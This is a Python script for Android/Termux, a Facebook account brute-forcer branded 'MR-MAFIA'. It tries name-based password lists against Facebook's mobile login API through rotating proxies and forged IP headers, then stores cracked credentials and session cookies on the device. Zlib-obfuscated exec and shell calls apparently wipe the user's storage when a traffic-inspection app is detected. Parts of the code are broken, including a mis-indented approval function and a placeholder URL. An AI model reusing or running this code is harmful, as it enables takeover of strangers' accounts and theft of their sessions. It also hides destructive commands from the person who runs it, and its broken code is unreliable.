#-----> Install Modules <-----#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
from http import cookies
import os
import zlib
from io import BytesIO
import pycurl
import getpass
import base64
import user_agent  
from faker import Faker  
import subprocess
try:
    import pycurl # type: ignore
except:
    print(' \n ! Wait Please Installing Missing Modules...!')
    os.system('pip install -q pycurl')
# try: import fake_useragent
# except: os.system('pip -q install fake-useragent')
try:
    from Crypto.Cipher import AES # type: ignore
    from Crypto.Util.Padding import pad, unpad # type: ignore
    from Crypto.Random import get_random_bytes # type: ignore
except:
    print(' \n ! Wait Please Installing Modules...!')
    os.system('pip install requests[socks] -y pip install faker -y pip install user_agent -y')
    os.system('pkg update -y && pkg upgrade -y')
    os.system('pkg install -y python clang libffi openssl')
    os.system('pip install pycryptodome')
#-----> Checking Latest File <-----#
os.system('echo -e "\e]0; MR-MAFIA \a"')
os.system('git pull -q')

#-----> Defines Modules -----#
try:
    import requests # type: ignore
except:
    print(' \n ! Wait Please Installing Missing Modules...!')
    os.system('pip install -q requests')
    import requests # type: ignore
import random, string, uuid, json, marshal, zlib, sys, time, gzip, subprocess, re, base64
from concurrent.futures import ThreadPoolExecutor as tred
from os import path
import shutil, hashlib
# from fake_useragent import settings
# from fake_useragent import UserAgent
from Crypto.Cipher import AES # type: ignore
from Crypto.Util.Padding import pad, unpad # type: ignore
from Crypto.Random import get_random_bytes # type: ignore
from io import BytesIO

#-----> Office installation <-----#
os.system('clear')
print('             \x1b[38;5;46m WELCOME TO MAFIA WORLD          ')
#os.system('pip install requests')
#os.system('pip install mechanize')
#os.system('pip install bs4 httpx')
#-----> Strg Permission Chk <-----#
def stg():
    try:
        open('/sdcard/XD.', 'a').write(' ')
    except:
        os.system('')
        stg()
stg()
#-----> Protection <-----#
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):pass
else:print(" \033[91;1m! \033[97;1mTurn Off Protection...!");exit()

#-----> Open Wp Gp CLEAR SCREEN <-----#
os.system('clear')
print('[+] Join Telegram channel \n')
exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11'))
#os.system('xdg-open https://t.me/+_51JvseDQNI2M2E0')
#-----> CHECK FOR HTTPCANARY <-----#
try:
    g = "anar"
    f="tt"
    file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))

    if f'com.h{f}pc{g}y.pro' in file_d:
        print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
        exit()
        
    else:
        pass
except Exception as e:
    pass

#-----> PRINT WITH ANIMATION <-----#
def xox(m):
    for x in m + '\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.07)
#-----> Proxy <-----#
def fetch_proxies():
    try:
        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
        proxies_data = g.json()
        proxies = proxies_data['data']
        with open('proxy.txt', 'w') as file:
            for proxy in proxies:
                proxy_ip = proxy['ip']
                proxy_port = proxy['port']
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                file.write(f"{proxy_url}\n")
        with open('proxy.txt', 'r') as file:
            saved_proxies = file.readlines()
        return saved_proxies
    except requests.exceptions.ConnectionError:
        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
    except Exception as e:
        sys.exit(e)
saved_proxies = fetch_proxies()

#-----> Method 1 <-----#        
def Maf_1(ids, names, passlist):
    try:
        global oks, cps, loop
        
        mrmafia = random.choice([P, W, G, S, B, Y, R, O])
        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            mafia_Ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/393.0.0.15.50;FBBV/825857276;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/443011581;FBCR/Etisalat;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X693;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
            proxy_u = random.choice(saved_proxies).strip()
            proxies = {'http':f'{proxy_u}'}
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            random_ip = IPV4_FAKEEEE()
            head = {
                "Host": "graph.facebook.com",
                "User-Agent": mafia_Ua,
                "Content-Type": "app_authlication/x-www-form-urlencoded", 
                "Content-Type": "application/json;charset=utf-8",
                "Accept-Encoding": "gzip",
                "forwarded": f"for={random_ip}; by={random_ip}",
                "x-forwarded-for": random_ip,
                "x-real-ip": random_ip,
                "client-ip": random_ip,    
            }
            data = {
                "locale": "en_US",
                "format": "json",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": 1,
                "adid": str(uuid.uuid4()),
                "device_id": str(uuid.uuid4()),
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            
            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
              
            po = requests.post(url, data=data, headers=head, proxies=proxies, allow_redirects=False).text
            q = json.loads(po)
            masked_id = mask_user(ids)
            masked_pw = mask_pass(pas)
            if 'session_key' in q:
                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookie = f"sb={ssbb};{coki}"
                print(f'\r\r{G} (MAFIA-OK) {masked_id} | {masked_pw}\033[0m')
                #print(f' [√] BISCUT-🍪: {mrmafia}' + cookie)
                open('/sdcard/MR-MAFIA/MAFIA-M1-COOKIE.txt','a').write(ids + '|' + pas +'|'+ cookie + '\n')
                open('/sdcard/MR-MAFIA/MAFIA-M1-OK.txt','a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif twf in str(po):
                if 'y' in pcp:
                    print(f'\r\r{B} (MAFIA-2F) ' + ids + ' | ' + pas + '\033[1;97m')
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r{O} (MAFIA-CP) ' + ids + ' | ' + pas +'\033[1;97m')
                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
        
        loop += 1
    
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    
    except Exception as e:
        pass
#-----> Method 2 <-----#        
def Maf_2(ids, names, passlist):
    try:
        global ok, loop
        
        mrmafia = random.choice([P, W, G, S, B, Y, R, O])
        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            mafia_Uax = f16()
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            locale, country = random_locale()
            random_ip = IPV4_FAKEEEE()
            data = {
                "MAFIA": str(uuid.uuid4()),
                "format": "json",
                "MR_MAFIA": str(uuid.uuid4()),
                "MAFIA_XD": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "locale": locale, 
                "client_country_code": country,
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            head = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Type": "application/json;charset=utf-8",
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201",
                "X-FB-Connection-Type": "unknown",
                "Connection": "Keep-Alive",
                "Host": "graph.facebook.com",
                "User-Agent": mafia_Uax,
                "Accept-Encoding": "gzip",
                "forwarded": f"for={random_ip}; by={random_ip}",
                "x-forwarded-for": random_ip,
                "x-real-ip": random_ip,
                "client-ip": random_ip,
            }
            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            
            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
            q = json.loads(po)
            
            masked_id = mask_user(ids)
            masked_pw = mask_pass(pas)
            if 'session_key' in q:
                coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookie = f"sb={ssbb};{coki}"
                print(f'\r\r{G} (MAFIA-OK) {masked_id} | {masked_pw}\033[0m')
                #token = q['access_token']
                #requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
                print(f' [√] BISCUT-🍪: {mrmafia}' + cookie)
                open('/sdcard/MR-MAFIA/MAFIA-M2-COOKIE.txt','a').write(ids + '|' + pas +'|'+ cookie + '\n')
                open('/sdcard/MR-MAFIA/MAFIA-M2-OK.txt','a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            
            elif twf in str(po):
                if 'y' in pcp:
                    print(f'\r\r{B} (MAFIA-2F) ' + ids + ' | ' + pas + '\033[1;97m')
                    twf.append(ids)
                    break
            
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r{O} (MAFIA-CP) {masked_id} | {masked_pw}\033[0m')
                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
        
        loop += 1
    
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    
    except Exception as e:
        pass
#-----> Method 3 <-----#        
def Maf_3(ids, names, passlist):
    try:
        global ok, loop
        
        mrmafia = random.choice([P, W, G, S, B, Y, R, O])
        sys.stdout.write(f'\r\r {W}({mrmafia}MR-MAFIA{W}) ({loop}) ({G}OK{W}/{len(oks)}) ({O}CP{W}/{len(cps)}) {W}')
        sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except IndexError:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            proxy_u = random.choice(saved_proxies).strip()
            proxies = {'http':f'{proxy_u}'}
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            random_ip = IPV4_FAKEEEE()
            locale, country = random_locale()
            data = {
                "MAFIA": str(uuid.uuid4()),
                "MR_MAFIA": str(uuid.uuid4()),
                "MAFIA_XD": "true",
                "format": "json",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "locale": locale,
                "client_country_code": country,
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            head = {
                "Accept-Encoding": "gzip",
                "Forwarded": f"for={random_ip}; by={random_ip}",
                "X-Forwarded-For": random_ip,
                "X-Real-IP": random_ip,
                "Client-IP": random_ip, 
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "User-Agent": f16(), 
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201",
                "X-FB-Connection-Type": "unknown",
                "Connection": "Keep-Alive",
            }
            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
            twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
            
            po = requests.post(url, data=data, headers=head, allow_redirects=False).text
            q = json.loads(po)
            
            if 'session_key' in q:
                ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookie = f"sb={ssbb};{ckkk}"
                print(f'\r\r{G} (MAFIA-OK) ' + ids + ' | ' + pas +'\033[1;97m')
                #print(f' [√] BISCUT-🍪: {mrmafia}' + cookie)
                open('/sdcard/MR-MAFIA/MAFIA-M3-COOKIE.txt','a').write(ids + '|' + pas +'|'+ cookie + '\n')
                open('/sdcard/MR-MAFIA/MAFIA-M3-OK.txt','a').write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            
            elif twf in str(po):
                if 'y' in pcp:
                    print(f'\r\r{B} (MAFIA-2F) ' + ids + ' | ' + pas + '\033[1;97m')
                    twf.append(ids)
                    break
            
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in pcp:
                    print(f'\r\r{O} (MAFIA-CP) ' + ids + ' | ' + pas +'\033[1;97m')
                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
                    cps.append(ids)
                    break
                else:
                    open('/sdcard/MR-MAFIA/MAFIA-CP.txt','a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
        
        loop += 1
    
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    
    except Exception as e:
        pass
#-----> method ua <-----#
def f16():  
    realme = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
    url1 = '[FBAN/FB4A;FBAV/538.0.0.53.70;FBBV/819570880;FBDM/{density=1.4375,width=720,height=1473};FBLC/fr_FR;FBRV/0;FBCR/Ooredoo;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/'+realme+';FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
    return url1
#-----> Colors <-----#
LYLW, W, R, G, Y, B, P, S, O = '\033[93;1m', '\033[97;1m', '\033[91;1m', '\033[92;1m', '\033[93;1m', '\033[94;1m', '\033[95;1m', '\033[96;1m', '\x1b[38;5;246m'
my_color = [P, W, G, S, B, Y, R, O]
ssn = requests.Session()
mrmafia = random.choice([P,W,G,S,B,Y,R,O])
#-----> Folder <-----#
folder_path = '/sdcard/MR-MAFIA'
try:os.makedirs(folder_path, exist_ok=True)
except:pass
#-----> Global Vars <-----#
loop, oks, cps, twf, pcp = 0, [], [], [], []
fake = Faker()
#-----> Vers <-----#
mafiavers = "V35.0"
#-----> Logo <-----#
logo = (f"""{W} 
   .88b  d88.  .d8b.  d88888b d888888b  .d8b.
   88'YbdP`88 d8' `8b 88'       `88'   d8' `8b
   88  88  88 88ooo88 88ooo      88    88ooo88
   88  88  88 88~~~88 88~~~      88    88~~~88
   88  88  88 88   88 88        .88.   88   88
   YP  YP  YP YP   YP YP      Y888888P YP   YP  {R}Bruter
{W}------------------------------------------------
   [✔] OWNER   : YOUCEF YT
   [✔] GITHUB  : MAFIA-143
   [✔] Status  : {R}PAID{W}
   [✔] VERSION : {mafiavers}
 {W}------------------------------------------------
{G} Nothing is impossible : just try to do :) 
 {W}------------------------------------------------""")
#-----> Def Clear + Logo <-----#
def clear():
    os.system('clear') #I love you, Mom 
    print(logo)
#-----> Def Line <-----#
def linex():
    print(f'{W}--------------------------------------------------')
#-----> PYCURL APPROVAL SYSTEM <-----#
def check_approval():
    clear()
    try:
        user = getpass.getuser()
    except:
        user = "user"
    key = "MAFIA-" + str(os.geteuid()) + user.replace('u0_a', '')
    
    # Check from YOUR website API
    buffer = BytesIO()
    curl = pycurl.Curl()
    curl.setopt(curl.URL, "https://fuck?key=" + key)
    curl.setopt(curl.WRITEDATA, buffer)
    curl.setopt(curl.TIMEOUT, 10)
    curl.setopt(curl.SSL_VERIFYPEER, 0)
    curl.setopt(curl.SSL_VERIFYHOST, 0)
    
    try:
        curl.perform()
    except:
        print(f" [{mrmafia}>>{W}] INTERNET ERROR")
        sys.exit()
    curl.close()
    
    response = buffer.getvalue().decode('utf-8')
    
    try:
        import json
        data = json.loads(response)
            
            linex()
            print(f" [1] WHATSAPP")
            print(f" [2] FACEBOOK")
            print(f" [0] EXIT")
            linex()
            
            adi = input(f" [{mrmafia}>>{W}] CHOICE : ")
            
            if adi in ['1','01']:
                nm = input(f" [{mrmafia}>>{W}] ENTER YOUR NAME : ")
                wp = input(f" [{mrmafia}>>{W}] ENTER YOUR WHATSAPP NUMBER : ")
                phn=(["+0000fuck"])
                url_wa = f"https://api.whatsapp.com/send?phone={phn}&text="
                tk = f'Hello Sir! Please Approve My Tool Key: {key} Name: {nm} WP: {wp}'
                tk = tk.replace(" ", "%20")
                
                os.system(f'xdg-open "{url_wa}{tk}"')
                sys.exit()
            
            elif adi in ['2','02']:
                os.system('xdg-open https://www.facebook.com/share/1DQ5r9EMcE/')
                sys.exit()
            
            else:
                sys.exit()
    
    except:
        print(f" [{mrmafia}>>{W}] SERVER ERROR TRY AGAIN LATER")
        sys.exit()
#-----> Main Menu <-----#
def menu():
    clear()
    print(' [1] Start File Clone \n [2] Dedup & Sort \n [0] Exit Menu ');linex()
    xd = input(f' [-] Choose : {G}\033[1;37m')
    if xd in ['1','01']:
        clear()
        print(f'[-] Exp :{G} /sdcard/mrmafia.txt {W}  ')
        linex()
        file = input(f'[-] File Put :{W} ')
        try:
            fo = open(file,'r').read().splitlines()
        except FileNotFoundError:
            print(f' [{mrmafia}>>{W}] File Not Found Fuck for you  :) ')
            time.sleep(1)
            exit()
        clear()
        print(f'[1] Method (Mix)  ')
        print(f'[2] Method (Old) ')
        print(f'[3] Method (Mix) {Y}NEW ')
        linex()
        mthd=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
        plist = []
        linex()
        print(f'[1] Auto pass ')
        print(f'[2] Manual pass ')
        print(f'[3] Auto pass 2 ({G}fast{W}) ')
        print(f'[4] Auto pass 3 ({G}smart{W}) ')
        linex()
        ppp=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
        clear()
        if ppp in ['1','01']:
                mthd_name = "AUTO-1"
                pass_info = "Auto Passwords (Full List)"
                plist.append('first first')
                plist.append('first last')
                plist.append('last first')
                plist.append('last last')
                plist.append('firstfirst')     
                plist.append('firstlast')
                plist.append('lastfirst')
                plist.append('lastlast')
                plist.append("firstlast123")
                plist.append("firstlast1234")
                plist.append('firstlast12345')
                plist.append('first 123')
                plist.append('first 1234')
                plist.append('first 12345')
                plist.append('first12')
                plist.append('first123')
                plist.append('first1234')
                plist.append('first12345')
                plist.append('first123456')
                plist.append('first123456789')
        elif ppp in ['3','03']:
                mthd_name = "AUTO-FAST"
                pass_info = "Auto Passwords (Fast List)"
                plist.append('first last')
                plist.append('firstlast')
                plist.append('first123')
                plist.append('first12345')
                plist.append('first1234')
                plist.append('first123456')
                plist.append('first1234567')
                plist.append('first123456789')
                plist.append('last123')
                plist.append('last1234')
        elif ppp in ['4','04']:
                mthd_name = "SMARTGEN"
                pass_info = "Smart Password Generator"
                plist.append('first2001')
                plist.append('first2002')
                plist.append('first2003')
                plist.append('first2004')
                plist.append('first2005')
                plist.append('first2006')
                plist.append('first2007')
                plist.append('first2024')
                plist.append('first2025')
                plist.append('first2026') 
        elif ppp in ['2','02']:
                mthd_name = "MANUAL"
                pass_info = "Manual Passwords (User Input)"
                try:
                    ps_limit = int(input(f'[{mrmafia}>>{W}] Pass limit : {G}\033[1;37m '))
                except:
                    ps_limit = 2
                clear()
                print(f'[{mrmafia}>>{W}] exp : {G}first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f'[{mrmafia}>>{W}] Put passs {i+1}: {G}\033[1;37m'))
        clear()
        print(f'[{mrmafia}>>{W}] Do Youu Want To Show Cp Ids ? (y/n) : {G}\033[1;37m')
        linex()
        cx=input(f'[{mrmafia}>>{W}] Chose :{G}\033[1;37m ')
        if cx in ['y','Y','yes','Yes','1']:
            pcp.append('y')
            
        else:
            pcp.append('n')
            
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            
            print(f'[{mrmafia}>>{W}] Total ids : {G}{total_ids}{W} >> Method : {G}{mthd}{W}')
            print(f'[{mrmafia}>>{W}] Password Mode : {G}{pass_info}{W} ')
            print(f'{W}[{mrmafia}>>{W}] After 2/4/5 Minutes ({G}On{W}/{R}Off{W}) Airplane Mode ')
            linex()
            for user in fo:
                ids,names = user.split('|')
                passlist = plist
                if mthd in ['1','01']:
                    crack_submit.submit(Maf_1,ids,names,passlist)
                elif mthd in ['2','02']:
                    crack_submit.submit(Maf_2,ids,names,passlist)
                elif mthd in ['3','03']:
                    crack_submit.submit(Maf_3,ids,names,passlist)
                    
        print(f'\033[1;37m')
        linex()
        print(f'[{mrmafia}>>{W}] PROCESS COMPLTED')
        print(f"[{mrmafia}>>{W}] Ok Ids : {G}{W} %s "%(len(oks)))
        print(f"[{mrmafia}>>{W}] Cp Ids : {R}{W} %s "%(len(cps)))
        linex()
        input(f'[{mrmafia}>>{W}] Press Enter Back  ')
        exit()
    elif xd in ['2','02']:
        linex()
        path = input(f" [{mrmafia}>>{W}] Enter file path : ").strip()
        clean_file(path)
    elif xd in ['0','00']:
        exit(f' [{mrmafia}>>{W}] Thanks For Use ')
    else:
        exit(f' [{mrmafia}>>{W}] Option not found in menu...')

#-----> ip fakeee Method + system random locale + system mask Data <-----#    
def IPV4_FAKEEEE():  
    return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
def random_locale():
    locales = [("en_US", "US"), ("en_GB", "GB"),("fr_FR", "FR"),("fr_DZ", "DZ"),("ar_MA", "MA"),("es_ES", "ES"),("pt_BR", "BR")]
    return random.choice(locales)
    
def mask_user(user):
    return user[:7] + '*' * (len(user) - 7) if len(user) > 7 else user

def mask_pass(pw):
    return pw[:4] + '*' * (len(pw) - 4) if len(pw) > 4 else pw
#----->Dedup & Sort<-----#
def clean_file(file_path):
    if not os.path.isfile(file_path):
        print("[-] File not found!");return
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.read().splitlines()
        original = len(lines)
        lines = list(dict.fromkeys(lines))
        seen_ids, valid = set(), []
        for line in lines:
            parts = line.strip().split("|")
            if len(parts) > 0 and parts[0].isdigit():
                fb_id = int(parts[0])
                if fb_id not in seen_ids:
                    seen_ids.add(fb_id)
                    valid.append((fb_id, line.strip()))
        if not valid:
            print(f" [-] No valid Facebook IDs found.");return
        sorted_lines = sorted(valid, key=lambda x: (len(str(x[0])), x[0]), reverse=True)
        with open(file_path, "w", encoding="utf-8") as f:
            for _, line in sorted_lines:
                f.write(line + "\n")
        print(f" [+] Before: {R}{original}{W} | After: {G}{len(sorted_lines)}")
        print(f" [+] Done!")
    except Exception as e:
        print(f"[!] Error: {e}")
#-----> Checking Menu MR'MAFIA <-----#
try: stg();check_approval()
except requests.exceptions.ConnectionError: sys.exit(f' {R}× {W}InterNet Contention Problem.!')
except Exception as e: sys.exit(e)
